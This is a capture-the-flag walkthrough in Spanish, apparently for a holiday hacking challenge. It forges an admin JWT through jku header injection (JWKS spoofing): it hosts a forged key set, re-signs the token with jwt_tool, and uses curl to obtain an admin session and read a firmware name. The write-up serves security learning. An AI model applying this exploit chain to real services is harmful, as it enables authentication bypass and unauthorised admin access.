+La respuesta nos devuelve un token JWT firmado con RS256.
+
+Token:
+```bash
+eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc3MjQ4OTQ5NCwiZXhwIjoxNzcyNDk2Njk0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.txHOmL-OX4aBEiUZrPxsJUitE5COI7WY7uhgbkSbngcV2P8IzvRyddTB6c9pjYvXwZgZ9gbN3iyg0twWk3wVsw7Ykx8PFf6ctUd5k_gChXAgFMbIy0MGhPke3JYPGIC4iL40kgSuyoFeQLofxQYKHMXm3EolLX5Dd3N64oXFWnSt6CLxFyr0Pn9gmWnjb_-Ei54__gPdL7U4YMwO4RQkF5G_lc7drZrirRokq5w67DiPJykBoYl-gSrYYxZSWQI3d0qZ4yLPDPRQXkwd3p54txbEqOlvGk3wfIfYXToj8-5oV5FHRcL8zP83LUJBlgEsVK9SdN8P9f-fKzRF1BJY9w
+```
+
+
+## 2. Analizar el token
+
+Inspeccionamos el JWT con jwt_tool:
+
+```bash
+jwt_tool.py eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc3MjQ4OTQ5NCwiZXhwIjoxNzcyNDk2Njk0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.txHOmL-OX4aBEiUZrPxsJUitE5COI7WY7uhgbkSbngcV2P8IzvRyddTB6c9pjYvXwZgZ9gbN3iyg0twWk3wVsw7Ykx8PFf6ctUd5k_gChXAgFMbIy0MGhPke3JYPGIC4iL40kgSuyoFeQLofxQYKHMXm3EolLX5Dd3N64oXFWnSt6CLxFyr0Pn9gmWnjb_-Ei54__gPdL7U4YMwO4RQkF5G_lc7drZrirRokq5w67DiPJykBoYl-gSrYYxZSWQI3d0qZ4yLPDPRQXkwd3p54txbEqOlvGk3wfIfYXToj8-5oV5FHRcL8zP83LUJBlgEsVK9SdN8P9f-fKzRF1BJY9w
+```
+
+Observamos:
+
+- alg: RS256 (firma asimétrica)
+- jku: http://idp.atnascorp/.well-known/jwks.json
+- kid: idp-key-2025
+- admin: false
+
+El parámetro jku indica que la clave pública se obtiene desde una URL externa.  
+Esto sugiere una posible explotación mediante inyección del parámetro jku (JWKS spoofing).
+
+
+## 3. Verificar acceso al servidor web local
+
+Las pistas indican que podemos hostear archivos en:
+
+http://paulweb.neighborhood/
+
+Nos movemos al directorio correspondiente:
+
+```bash
+cd ~/www
+ls -la
+```
+
+Creamos un archivo de prueba:
+
+```bash
+nano jwks.json
+```
+
+Escribimos contenido simple para testear y luego verificamos acceso:
+
+```bash
+curl http://paulweb.neighborhood/jwks.json
+```
+Si responde correctamente, podemos usar esta ubicación para alojar nuestra JWKS maliciosa.
+
+
+## 4. Generar token modificado con JWKS spoofing
+
+Ejecutamos jwt_tool en modo exploit:
+
+```bash
+jwt_tool.py eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc3MjQ4OTQ5NCwiZXhwIjoxNzcyNDk2Njk0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.txHOmL-OX4aBEiUZrPxsJUitE5COI7WY7uhgbkSbngcV2P8IzvRyddTB6c9pjYvXwZgZ9gbN3iyg0twWk3wVsw7Ykx8PFf6ctUd5k_gChXAgFMbIy0MGhPke3JYPGIC4iL40kgSuyoFeQLofxQYKHMXm3EolLX5Dd3N64oXFWnSt6CLxFyr0Pn9gmWnjb_-Ei54__gPdL7U4YMwO4RQkF5G_lc7drZrirRokq5w67DiPJykBoYl-gSrYYxZSWQI3d0qZ4yLPDPRQXkwd3p54txbEqOlvGk3wfIfYXToj8-5oV5FHRcL8zP83LUJBlgEsVK9SdN8P9f-fKzRF1BJY9w -X s -ju http://paulweb.neighborhood/jwks.json -T
+```
+
+Durante el proceso interactivo:
+
+1. Modificamos el header:
+   - Cambiamos el valor de jku por:
+     http://paulweb.neighborhood/jwks.json
+
+2. Modificamos el kid:
+   - Cambiamos a "kid": "jwt_tool"
+
+3. Modificamos el payload:
+   - Cambiamos "admin": false → true
+
+
+La herramienta genera:
+
+- Un nuevo JWT firmado
+- Una JWKS guardada en:
+  /home/paul/.jwt_tool/jwttool_custom_jwks.json
+
+Nuevo token: 
+```bash
+eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJqd3RfdG9vbCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc3MjQ4OTQ5NCwiZXhwIjoxNzcyNDk2Njk0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.KQM826XXcht7qBmhBc-aW9oZweaFAZ2DeRQK9YLPRnoT3gFcQz5pCZ9o8FLKAyDUovUP7NxEeEAxaQwJaRHdHkOAM3HXrK-kk-T7UXvmuhXDMHjBM48BqrpYsxIV_qrJ2xjZTkAL16PgI40goAyX4nknvZQvyJldiT-GvCDLoWej0qIe-v66BBseqzLBR7Tr3WvrPUhQX2MG1J13k9Fk2CWGXhmdVmr82hh89VhD-t-YW0JakuXmsC_MEXyf-XGlyFE2IfBPPXxnpdQnLsTvITr5CkfD6TMBwqD0RgiM87jturYwxMmjXR0J8JwHfHRVmXQO4vNcNuVRevwWxGdsHQ
+```
+
+## 5. Publicar la JWKS maliciosa
+
+Copiamos el contenido generado:
+
+```bash
+cat /home/paul/.jwt_tool/jwttool_custom_jwks.json
+```
+```bash
+{
+    "keys":[
+        {
+            "kty":"RSA",
+            "kid":"jwt_tool",
+            "use":"sig",
+            "e":"AQAB",
+            "n":"tchOVdXUg9T_HV2f9TVZeoH3G2uB243yAa6Hh7RsyeOy1tAs-OEnD1_5TWrljY-RqoSfoEjbE38rtVLp_weDfroHn8I-I9lGuAA-wDI70sOTm4tSSDuwD9VBFmXI-dFwsTN446yRJagaZP4ZgfPoreOL9bpfL_7HxPOJZ14z2ZJZaP-7hr1HSasyTkkRG3u4pylgoRUu2ZUxWhqNg1A7e1YNUrtlqagooFxGYkZBXbBXJbHdMLn-PSs3tc3pWQEQHPAYBSFHnCzyTEOFQOixh-OQq3KyL5sHKvOWUhTyO2USOmJHLYUbCEd6_DfrcR4P5EctwTlTEU1ssXONGgxHAQ"
+        }
+    ]
+}
+```
+
+Pegamos ese contenido dentro del archivo:
+
+```bash
+nano ~/www/jwks.json
+```
+
+Ahora el servidor local expone nuestra clave pública.
+
+
+## 6. Autenticarnos con el nuevo token
+
+Probamos el nuevo JWT:
+```bash
+curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJqd3RfdG9vbCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc3MjQ4OTQ5NCwiZXhwIjoxNzcyNDk2Njk0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.KQM826XXcht7qBmhBc-aW9oZweaFAZ2DeRQK9YLPRnoT3gFcQz5pCZ9o8FLKAyDUovUP7NxEeEAxaQwJaRHdHkOAM3HXrK-kk-T7UXvmuhXDMHjBM48BqrpYsxIV_qrJ2xjZTkAL16PgI40goAyX4nknvZQvyJldiT-GvCDLoWej0qIe-v66BBseqzLBR7Tr3WvrPUhQX2MG1J13k9Fk2CWGXhmdVmr82hh89VhD-t-YW0JakuXmsC_MEXyf-XGlyFE2IfBPPXxnpdQnLsTvITr5CkfD6TMBwqD0RgiM87jturYwxMmjXR0J8JwHfHRVmXQO4vNcNuVRevwWxGdsHQ
+```
+
+Si todo está correcto, obtenemos una cookie de sesión válida.
+
+Set-Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aaYPkA.yKvAzRkhBXZCFns9HK-PAv7VTjs
+
+
+## 7. Acceder al panel administrativo
+
+Usamos la cookie devuelta:
+
+```bash
+curl -H 'Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aaYPkA.yKvAzRkhBXZCFns9HK-PAv7VTjs' http://gnome-48371.atnascorp/diagnostic-interface
+```
+
+Accedemos al panel con privilegios de administrador.
+
+## 8. Identificar el firmware instalado
+
+En el log del sistema observamos:
+
+Firmware Update available: refrigeration-botnet.bin  
+Firmware update downloaded.
+
+![identityProviderCompleto](image%20copy%2050.png)
+
+## Resultado
+
+El nombre del firmware instalado es:
+
+refrigeration-botnet.bin
